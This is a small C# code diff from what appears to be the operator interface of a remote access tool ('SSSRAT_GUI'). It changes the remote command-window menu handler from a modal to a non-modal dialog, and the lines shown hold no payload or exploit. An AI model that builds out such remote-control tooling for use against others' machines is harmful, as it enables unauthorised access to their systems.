@@ -215,7 +215,7 @@ namespace SSSRAT_GUI {
 		private void CMDToolStripMenuItemClick(object sender, EventArgs e) {
 			var cmd = new FrmCMD();
 			cmd.Init(GetCurrentSelectedClient());
-			cmd.ShowDialog();
+			cmd.Show();
 		}
 		#endregion
 	}
